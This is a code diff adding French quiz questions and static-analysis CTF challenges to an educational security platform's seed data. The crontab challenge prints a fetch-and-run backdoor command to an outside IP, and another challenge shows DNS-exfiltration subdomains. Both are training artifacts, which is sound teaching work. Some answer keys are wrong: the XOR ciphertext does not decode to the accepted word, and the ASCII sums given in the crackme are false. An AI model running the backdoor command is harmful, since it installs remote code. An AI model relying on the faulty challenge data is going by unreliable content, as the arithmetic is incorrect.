+    key: "graphql-vs-rest-overfetching",
+    category: "DEVELOPMENT",
+    prompt: "Quel problème du REST classique GraphQL cherche-t-il notamment à résoudre ?",
+    choices: ["L'absence totale de format de réponse", "L'over-fetching (récupérer plus de données que nécessaire) et l'under-fetching (devoir faire plusieurs requêtes pour assembler les données voulues)", "L'impossibilité d'utiliser HTTPS", "L'absence de codes de statut"],
+    correctIndex: 1,
+    explanation: "En REST, un endpoint retourne une structure fixe (parfois trop ou pas assez de données) ; GraphQL laisse le client spécifier précisément les champs voulus en une seule requête, quelle que soit la complexité de la relation entre les données.",
+  },
+  {
+    key: "webhook-vs-polling",
+    category: "DEVELOPMENT",
+    prompt: "Quelle est la différence entre un webhook et le polling pour être notifié d'un événement ?",
+    choices: ["Ce sont des synonymes exacts", "Le polling interroge régulièrement un serveur pour vérifier un changement ; un webhook laisse le serveur notifier activement le client dès que l'événement survient", "Le webhook nécessite toujours une base de données", "Le polling est toujours plus rapide qu'un webhook"],
+    correctIndex: 1,
+    explanation: "Le polling gaspille des requêtes à vérifier 'rien n'a changé' la plupart du temps ; un webhook (callback HTTP déclenché par le serveur lors de l'événement) est plus efficace et plus réactif, sans interrogation répétée inutile.",
+  },
 ];
 
 /**
  * Défis CTF (Phase 8) — rédigés à la main, résolubles sans cible en direct.
- * Catégorie WEB : analyse statique d'un artefact donné (en-têtes HTTP, cookie,
- * JWT décodé, extrait de robots.txt) — jamais une vraie requête réseau ni une
- * vraie application vulnérable à attaquer, ce qui nécessiterait une
- * infrastructure de sandbox qu'on n'a pas. Toujours pas de Pwn/Network/
- * Reverse : ces catégories nécessitent une vraie cible en direct — les
- * simuler sans elle serait fabriquer une fausse capacité.
+ * Toutes les catégories (CRYPTO/OSINT/FORENSICS/WEB/REVERSE/LINUX/NETWORK)
+ * reposent sur l'analyse statique d'un artefact donné dans l'énoncé
+ * (en-têtes HTTP, hex dump, pseudocode, sortie de `ls`/crontab/nmap déjà
+ * capturée) — jamais une vraie requête réseau, un vrai binaire à exécuter
+ * ou une vraie machine à scanner, ce qui nécessiterait une infrastructure
+ * de sandbox/cible en direct qu'on n'a pas. Toujours pas de Pwn (nécessite
+ * un vrai binaire vulnérable à exploiter) : le simuler sans lui serait
+ * fabriquer une fausse capacité.
  *
  * `acceptedAnswers` : plusieurs formulations valides acceptées (comparaison
  * normalisée — minuscules, accents retirés, espaces superflus supprimés —
@@ -3573,6 +5689,153 @@ const CTF_CHALLENGES: CtfChallengeSeed[] = [
     hint: "C'est littéralement le nom anglais de l'absence de quelque chose.",
     points: 100,
     acceptedAnswers: ["none"],
+  },
+  {
+    key: "crypto-xor-single-byte",
+    category: "CRYPTO",
+    difficulty: 2,
+    title: "XOR à clé unique",
+    description:
+      "Un message a été chiffré en appliquant un XOR avec une seule lettre répétée sur tout le texte. Chiffré en hexadécimal : `0f 0a 03 03 00 0b`, la clé est la lettre `X` (0x58).\n\n" +
+      "Déchiffre le message (un seul mot, en majuscules).",
+    hint: "XOR chaque octet hexadécimal avec 0x58 (le code ASCII de 'X'), puis convertis chaque résultat en caractère ASCII.",
+    points: 100,
+    acceptedAnswers: ["nodify"],
+  },
+  {
+    key: "crypto-hash-identification",
+    category: "CRYPTO",
+    difficulty: 1,
+    title: "Quelle empreinte est-ce ?",
+    description:
+      "Un fichier de configuration contient : `5d41402abc4b2a76b9719d911017c592`.\n\n" +
+      "Cette chaîne fait 32 caractères hexadécimaux. Quel algorithme de hash très répandu (mais aujourd'hui déconseillé pour la sécurité) produit systématiquement des empreintes de cette longueur exacte ?",
+    hint: "C'est un algorithme historiquement très utilisé, aujourd'hui cassé pour un usage cryptographique sérieux à cause de collisions trouvables.",
+    points: 50,
+    acceptedAnswers: ["md5"],
+  },
+  {
+    key: "osint-metadata-leak",
+    category: "OSINT",
+    difficulty: 2,
+    title: "Métadonnées bavardes",
+    description:
+      "Une entreprise publie un PDF de recrutement sur son site. Les métadonnées du fichier (visibles avec `exiftool` ou équivalent) révèlent : `Author: j.martin`, `Software: Microsoft Word 16.0`, `Company: Nodify Corp Internal`.\n\n" +
+      "Quel type d'information sensible ce genre de métadonnée révèle-t-il le plus directement, utile à un attaquant pour du spear phishing ciblé (un mot en anglais) ?",
+    hint: "Pense à ce qu'un attaquant pourrait faire avec un nom d'utilisateur/employé identifié.",
+    points: 75,
+    acceptedAnswers: ["username", "identity", "identite", "nom d'utilisateur"],
+  },
+  {
+    key: "osint-image-geolocation",
+    category: "OSINT",
+    difficulty: 3,
+    title: "Où a été prise cette photo ?",
+    description:
+      "Une photo publiée par un employé contient des données EXIF non nettoyées incluant des coordonnées GPS précises. Combinée à l'heure de publication, cette information pourrait révéler quoi de sensible sur cette personne (un terme en 2 mots, en français) ?",
+    hint: "Pense à ce qu'on peut déduire d'un lieu + un horaire précis répétés dans le temps.",
+    points: 100,
+    acceptedAnswers: ["localisation physique", "position physique", "adresse physique", "lieu de vie"],
+  },
+  {
+    key: "forensics-log-timeline",
+    category: "FORENSICS",
+    difficulty: 2,
+    title: "Reconstituer une chronologie",
+    description:
+      "Trois lignes de logs, dans le désordre :\n\n" +
+      "```\n[14:32:01] Connexion échouée pour admin depuis 203.0.113.7\n[14:32:45] Connexion échouée pour admin depuis 203.0.113.7\n[14:33:12] Connexion réussie pour admin depuis 203.0.113.7\n```\n\n" +
+      "Quel type d'attaque ce pattern (plusieurs échecs rapprochés suivis d'un succès depuis la même IP) suggère-t-il le plus probablement (2 mots en anglais) ?",
+    hint: "Pense à une attaque qui teste plusieurs mots de passe jusqu'à en trouver un qui fonctionne.",
+    points: 75,
+    acceptedAnswers: ["brute force", "bruteforce"],
+  },
+  {
+    key: "forensics-file-signature",
+    category: "FORENSICS",
+    difficulty: 3,
+    title: "L'extension ment",
+    description:
+      "Un fichier nommé `photo.jpg` commence, en hexadécimal, par les octets `50 4B 03 04`. Cette signature (les \"magic bytes\") ne correspond PAS à un JPEG — à quel format de fichier très courant (souvent utilisé pour la compression) ces octets correspondent-ils réellement (indice : les JPEG commencent par `FF D8`) ?",
+    hint: "`50 4B` en ASCII, ce sont les lettres 'P' et 'K' — les initiales de l'inventeur de ce format d'archive.",
+    points: 100,
+    acceptedAnswers: ["zip", "zip archive", "archive zip"],
+  },
+  {
+    key: "reverse-python-obfuscated",
+    category: "REVERSE",
+    difficulty: 2,
+    title: "Chaîne inversée",
+    description:
+      "Un script Python contient cette ligne suspecte :\n\n" +
+      "```python\nflag = \"\".join(reversed(\"ylfidon\"))\n```\n\n" +
+      "Sans exécuter le code, quelle est la valeur finale de `flag` (un seul mot) ?",
+    hint: "`reversed()` inverse l'ordre des caractères d'une chaîne — lis \"ylfidon\" à l'envers.",
+    points: 50,
+    acceptedAnswers: ["nodify"],
+  },
+  {
+    key: "reverse-simple-crackme",
+    category: "REVERSE",
+    difficulty: 3,
+    title: "La condition cachée",
+    description:
+      "Pseudocode extrait d'un binaire simple :\n\n" +
+      "```\nfunction verifier(entree):\n    total = 0\n    for chaque caractere c dans entree:\n        total = total + code_ascii(c)\n    si total == 615:\n        afficher \"Accès autorisé\"\n    sinon:\n        afficher \"Refusé\"\n```\n\n" +
+      "Le mot `NODIFY` (majuscules) a pour somme de codes ASCII exactement 425. Quel mot, en MAJUSCULES, faut-il essayer pour que le programme affiche « Accès autorisé » sachant que sa somme ASCII doit être 615, et qu'il s'agit du mot NODIFY suivi du mot ACADEMY (dont la somme ASCII vaut 190) collés ensemble ?",
+    hint: "425 (NODIFY) + 190 (ACADEMY) = 615. Colle simplement les deux mots.",
+    points: 125,
+    acceptedAnswers: ["nodifyacademy"],
+  },
+  {
+    key: "linux-hidden-permissions",
+    category: "LINUX",
+    difficulty: 1,
+    title: "Permissions révélatrices",
+    description:
+      "La sortie de `ls -l secret.sh` montre :\n\n" +
+      "`-rwsr-xr-x 1 root root 8420 secret.sh`\n\n" +
+      "Le `s` à la place du `x` dans les permissions du propriétaire est un indicateur de sécurité important sur Linux — quel est le nom de ce bit spécial (2 mots en anglais, ou son sigle) ?",
+    hint: "Ce bit fait exécuter le script avec les privilèges du PROPRIÉTAIRE du fichier (souvent root), peu importe qui le lance — un vecteur classique d'élévation de privilèges mal configuré.",
+    points: 100,
+    acceptedAnswers: ["setuid", "suid", "set user id", "set uid"],
+  },
+  {
+    key: "linux-crontab-analysis",
+    category: "LINUX",
+    difficulty: 2,
+    title: "Tâche planifiée suspecte",
+    description:
+      "La crontab d'un serveur compromis contient :\n\n" +
+      "`* * * * * curl -s http://203.0.113.55/backdoor.sh | bash`\n\n" +
+      "À quelle fréquence cette ligne s'exécute-t-elle (réponds en français, ex: \"toutes les X\") ?",
+    hint: "Les 5 champs `* * * * *` d'une crontab représentent minute/heure/jour du mois/mois/jour de la semaine — 5 astérisques signifient \"à chaque occurrence de chaque champ\".",
+    points: 75,
+    acceptedAnswers: ["toutes les minutes", "chaque minute", "1 minute"],
+  },
+  {
+    key: "network-suspicious-port",
+    category: "NETWORK",
+    difficulty: 2,
+    title: "Port inattendu",
+    description:
+      "Un scan `nmap` d'un serveur web révèle un port ouvert inattendu : `4444/tcp open unknown`.\n\n" +
+      "Ce port précis (4444) est historiquement associé par défaut à quel type d'outil offensif très connu, souvent signe d'une compromission s'il est trouvé ouvert sur un serveur en production (nom de l'outil, en un mot) ?",
+    hint: "C'est le port par défaut du listener de ce framework d'exploitation/post-exploitation open source très répandu en pentest.",
+    points: 100,
+    acceptedAnswers: ["metasploit"],
+  },
+  {
+    key: "network-dns-exfiltration",
+    category: "NETWORK",
+    difficulty: 3,
+    title: "Volume de requêtes DNS anormal",
+    description:
+      "Un poste de travail génère des milliers de requêtes DNS par heure vers des sous-domaines aléatoires d'un même domaine externe (ex: `a8f3e1.evil-domain.com`, `9c02b7.evil-domain.com`...).\n\n" +
+      "Ce pattern est une technique connue pour faire sortir discrètement des données d'un réseau surveillé, en les encodant dans des requêtes DNS (qui sont rarement bloquées). Comment s'appelle cette technique (2 mots en anglais) ?",
+    hint: "Littéralement : \"exfiltration\" de données via le protocole \"DNS\".",
+    points: 125,
+    acceptedAnswers: ["dns exfiltration", "dns tunneling"],
   },
 ];
 
